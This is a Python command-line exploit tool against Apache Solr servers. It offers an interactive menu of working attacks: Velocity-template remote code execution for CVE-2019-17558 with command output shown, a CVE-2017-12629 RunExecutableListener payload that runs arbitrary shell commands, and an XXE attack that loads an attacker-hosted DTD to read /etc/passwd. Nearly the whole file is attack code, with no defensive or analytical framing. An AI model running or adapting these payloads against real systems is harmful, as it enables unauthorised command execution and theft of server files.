import argparse,requests,time

banner='''
              ___               __                       __      __                   ___      
             /\\_ \\             /\\ \\                     /\\ \\    /\\ \\__               /\\_ \\     
  ____    ___\\//\\ \\    _ __    \\ \\ \\___      __      ___\\ \\ \\/'\\\\ \\ ,_\\   ___     ___\\//\\ \\    
 /',__\\  / __`\\\\ \\ \\  /\\`'__\\   \\ \\  _ `\\  /'__`\\   /'___\\ \\ , < \\ \\ \\/  / __`\\  / __`\\\\ \\ \\   
/\\__, `\\/\\ \\L\\ \\\\_\\ \\_\\ \\ \\/     \\ \\ \\ \\ \\/\\ \\L\\.\\_/\\ \\__/\\ \\ \\\\`\\\\ \\ \\_/\\ \\L\\ \\/\\ \\L\\ \\\\_\\ \\_ 
\\/\\____/\\ \\____//\\____\\\\ \\_\\      \\ \\_\\ \\_\\ \\__/.\\_\\ \\____\\\\ \\_\\ \\_\\ \\__\\ \\____/\\ \\____//\\____\\
 \\/___/  \\/___/ \\/____/ \\/_/       \\/_/\\/_/\\/__/\\/_/\\/____/ \\/_/\\/_/\\/__/\\/___/  \\/___/ \\/____/
                                                                                               
                                                                                                                   
'''
def args():
    parser = argparse.ArgumentParser(description='Input url and your IPS',usage='%(prog)s --url [url]')
    parser.add_argument('--url',type=str,help='for example: --url http://127.0.0.1:8983/')
    #parser.add_argument('--ips', type=str, help='for example: --ips 192.168.1.1:4444',default=None)
    #parser.print_help()
    return parser.parse_args()

def choice(url):
    while(1):
        cve = '''
        1.CVE-2017-12629-RCE(No echo)
        2.CVE-2017-12629-XXE
        3.CVE-2019-17558-RCE
        4.exit
        '''
        print(cve)
        print('input \'exit\' for exit.')
        index=input("plz choice your exp:")
        if(index=='4'):
            exit(0)
        if(index=='3'):
            print('CVE-2019-17558-RCE')
            CVE_2019_17558(url)
        if(index=='2'):
            print('CVE-2017-12629-XXE')
            CVE_2017_12629_XXE(url)
        if(index=='1'):
            print('CVE-2017-12629-RCE')
            CVE_2017_12629_RCE(url)
        if (index == 'exit'):
            return




def CVE_2019_17558(url):

    host=url.replace('http://','')
    host=host.replace('https://','')

    r = requests.get(url + 'solr/admin/cores?indexInfo=false&wt=json')
    if(r.status_code==200):
        core = input('plz input your core name:')
        datas='''{
    "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
'''
        head={"Host":host[:-1],
              "Content-Type": "application/json" ,
              "Content-Length": "259"}
        r2=requests.post(url + 'solr/{}/config'.format(core),data=datas,headers=head)
        if(r2.status_code==200):
            print('Now is RCE-Modle,input \'back\' for backing to choice-list.')
            while(1):
                cmd = input('plz input your command:')
                if(cmd=='back'):
                    return
                taget=url+'solr/{}/select?q=1&&wt=velocity&v.template=custom&' \
                          'v.template.custom=%23set($x=%27%27)+' \
                          '%23set($rt=$x.class.forName(%27java.lang.Runtime%27))' \
                          '+%23set($chr=$x.class.forName(%27java.lang.Character%27))' \
                          '+%23set($str=$x.class.forName(%27java.lang.String%27))+' \
                          '%23set($ex=$rt.getRuntime().exec(%27{}%27))+$ex.waitFor()+' \
                          '%23set($out=$ex.getInputStream())+' \
                          '%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(core,cmd)
                r3=requests.get(taget)
                print(r3.content)
                print('<====================================================================>')
        else:
            print('plz check core name')
            print('<====================================================================>')
            return
    else:
        print('This URL do not available!')
        print('<====================================================================>')
        return

def CVE_2017_12629_RCE(url):
    host=url.replace('http://','')
    host=host.replace('https://','')
    while(1):
        print('input \'back\' for backing to choice-list.')
        core = input('plz input your core name(defult_name:demo):')
        if (core == 'back'):
            print('<====================================================================>')
            return
        cmd = input('RCE(No echo)-Model,plz input your cmd:')
        if (core == 'back'):
            print('<====================================================================>')
            return
        if(core==''):
            core = 'demo'
        head={"Host":host[:-1],
            'Accept': "*/*",
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Connection': 'close',
            'Content-Type': 'application/json'}
        listener = input('plz input your listener name:')
        datas='''
        {"add-listener":{"event":"postCommit","name":"'''+listener+'''","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "'''+cmd+'''"]}}
        '''
        print(datas)
        r = requests.post(url + 'solr/{}/config'.format(core),headers=head,data=datas)
        if(r.status_code==200 and b'errorMessages' not in r.content):
            print('Your listener was created!')
            time.sleep(5)
            datas='''[{"id":"test"}]'''
            r2=requests.post(url + 'solr/{}/update'.format(core),headers=head,data=datas)
            if(r2.status_code==200):
                print(r2.content)
                print('scuess,wait 10s,let bash fly!')
                print('<====================================================================>')
            else:
                print('This URL do not available!')
                print('<====================================================================>')
        else:
            print('Your listener already exists or your core name do not exests!plz check!')
            print('<====================================================================>')

def CVE_2017_12629_XXE(url):
    host=url.replace('http://','')
    host=host.replace('https://','')
    remote_dtd='''<!ENTITY % file SYSTEM "file:///etc/passwd">
                  <!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">'''
    print('plz create remote dtd like this:')
    print(remote_dtd)
    while(1):
        print('input \'back\' for backing to choice-list.')
        ips=input('plz input your remote file url:')
        if(ips=='back'):
            print('<====================================================================>')
            return
        url=url+'solr/demo/select?q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C' \
            '!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22{}%22%3E' \
            '%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser'.format(ips)
        head={"Host":host[:-1],
                'Accept': "*/*",
                'Accept-Language': 'en',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
                'Connection': 'close'}
        r=requests.get(url,headers=head)
        print(r.content)
        print('<====================================================================>')


if __name__=='__main__':
    print(banner)
    arg=args()
    url=arg.url
    #print(url,ips)
    if(url):
        choice(url)
    else:
        print('url is None!')
        exit(0)